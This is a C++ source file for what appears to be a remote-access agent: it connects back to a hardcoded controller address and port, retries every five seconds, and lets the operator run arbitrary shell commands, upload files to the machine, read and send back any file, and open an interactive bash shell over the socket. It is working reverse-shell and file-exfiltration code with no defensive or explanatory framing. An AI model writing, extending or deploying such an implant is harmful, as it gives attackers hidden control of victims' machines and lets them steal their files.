#include <iostream>
#include <vector>
#include <string>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <fstream>
#include <pty.h>

struct PacketHeader {
    uint32_t command_id;
    uint32_t data_len;
};

bool read_exact(int sock, uint8_t* buffer, size_t size) {
    size_t total_read = 0;
    while (total_read < size) {
        ssize_t bytes_read = recv(sock, buffer + total_read, size - total_read, 0);
        if (bytes_read <= 0) return false;
        total_read += bytes_read;
    }
    return true;
}

std::string execute_command(const std::string& command) {
    int pipefd[2];
    if (pipe(pipefd) == -1) return "[-] Error: pipe\n";

    pid_t pid = fork();
    if (pid == -1) return "[-] Error: fork\n";

    if (pid == 0) {
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[0]);
        close(pipefd[1]);

        execl("/bin/sh", "sh", "-c", command.c_str(), nullptr);
        exit(1);
    } 
    else {
        close(pipefd[1]);
        std::string output;
        char buffer[4096];
        ssize_t bytes_read;

        while ((bytes_read = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
            output.append(buffer, bytes_read);
        }
        close(pipefd[0]);
        waitpid(pid, nullptr, 0);

        if (output.empty()) {
            return "[No output].\n";
        }
        return output;
    }
}

void send_response(int sock, uint32_t cmd_id, const std::string &msg) {
    PacketHeader resp_header{};
    resp_header.command_id = htonl(cmd_id);
    resp_header.data_len = htonl(msg.size());
    send(sock, &resp_header, sizeof(resp_header), 0);
    send(sock, msg.c_str(), msg.size(), 0);
}

void run_pyt_shell(int sock) {
    int master_fd;

    pid_t pid = forkpty(&master_fd, nullptr, nullptr, nullptr);

    if (pid < 0) {
        send_response(sock, 5, "Couldn't create PTY");
        return;
    }

    if (pid == 0) {
        setenv("TERM", "xterm-256color", 1);
        execl("/bin/bash", "bash", "--login", nullptr);
        exit(1);
    }

    char buffer[4096];
    fd_set fds;
    bool running = true;

    while (running) {
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        FD_SET(master_fd, &fds);

        int max_fd = (sock > master_fd) ? sock : master_fd;

        int activity = select(max_fd + 1, &fds, nullptr, nullptr, nullptr);
        if (activity < 0) break;

        if (FD_ISSET(sock, &fds)) {
            ssize_t bytes_recv = recv(sock, buffer, sizeof(buffer), 0);
            if (bytes_recv <= 0) {
                running = false;
                break;
            }
            if (write(master_fd, buffer, bytes_recv) < 0) {
                running = false;
                break;
            }
        }

        if (FD_ISSET(master_fd, &fds)) {
            ssize_t bytes_read = read(master_fd, buffer, sizeof(buffer));

            if (bytes_read <= 0) {
                running = false;
                break;
            }

            if (send(sock, buffer, bytes_read, 0) <= 0) {
                running = false;
                break;
            }
        }
    }

    close(master_fd);
    kill(pid, SIGKILL);
    int status;
    waitpid(pid, &status, 0);

    std::string eof_seq = "\xff\xff\xff\xff_EOF_";
    send(sock, eof_seq.c_str(), eof_seq.size(), 0);
}

int main() {
    const char* server_ip = "127.0.0.1";
    int port = 9001;

    while (true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            sleep(5);
            continue;
        }

        sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, server_ip, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            sleep(5);
            continue;
        }

        bool session_active = true;
        bool terminate_agent = false;

        while (session_active){

            PacketHeader req_header{};
            
            if (!read_exact(sock, reinterpret_cast<uint8_t*>(&req_header), sizeof(req_header))) {
                break;
            }

            req_header.command_id = ntohl(req_header.command_id);
            req_header.data_len = ntohl(req_header.data_len);

            switch (req_header.command_id) {
                case 1: { // Command execution
                    std::vector<uint8_t> payload_buffer(req_header.data_len);
                    if (read_exact(sock, payload_buffer.data(), req_header.data_len)) {
                        std::string command(payload_buffer.begin(), payload_buffer.end());
                        
                        std::string result = execute_command(command);

                        PacketHeader resp_header{};
                        resp_header.command_id = htonl(1);
                        resp_header.data_len = htonl(result.size());

                        send(sock, &resp_header, sizeof(resp_header), 0);
                        send(sock, result.c_str(), result.size(), 0);
                    }
                    break;
                }
                case 2: {
                    std::vector<uint8_t> payload(req_header.data_len);
                    if (read_exact(sock, payload.data(), req_header.data_len)) {
                        uint32_t filename_len;
                        std::memcpy(&filename_len, payload.data(), 4);
                        filename_len = ntohl(filename_len);

                        std::string filename(reinterpret_cast<char*>(payload.data() + 4), filename_len);

                        size_t file_offset = 4 + filename_len;
                        size_t file_size = req_header.data_len - file_offset;

                        std::ofstream out_file(filename, std::ios::binary);
                        if (out_file) {
                            out_file.write(reinterpret_cast<char*>(payload.data() + file_offset), file_size);
                            out_file.close();
                            send_response(sock, 2, "File saved as: " + filename);
                        } else {
                            send_response(sock, 5, "Could't create file");
                        }
                    }
                    break;
                }
                case 3: {
                    std::vector<uint8_t> payload(req_header.data_len);
                    if (read_exact(sock, payload.data(), req_header.data_len)) {
                        std::string filepath(payload.begin(), payload.end());

                        std::ifstream in_file(filepath, std::ios::binary | std::ios::ate);
                        if (!in_file) {
                            send_response(sock, 5, "File not exists");
                        } else {
                            std::streamsize file_size = in_file.tellg();
                            in_file.seekg(0, std::ios::beg);

                            std::vector<char> file_buffer (file_size);
                            if (in_file.read(file_buffer.data(), file_size)) {
                                PacketHeader resp_header {};
                                resp_header.command_id = htonl(3);
                                resp_header.data_len = htonl(static_cast<uint32_t>(file_size));

                                send(sock, &resp_header, sizeof(resp_header), 0);
                                send(sock, file_buffer.data(), file_size, 0);
                            } else {
                                send_response(sock, 5, "Read error");
                            }

                            in_file.close();
                        }
                    }
                    break;
                }
                case 4: { // exit
                    session_active = false;
                    terminate_agent = true;
                    break;
                } case 6: {
                    run_pyt_shell(sock);
                }
                default: {
                    break;
                }
            }
        }
        close(sock);
        if (terminate_agent) {
            break;
        }

        sleep(5);
    }
    return 0;
}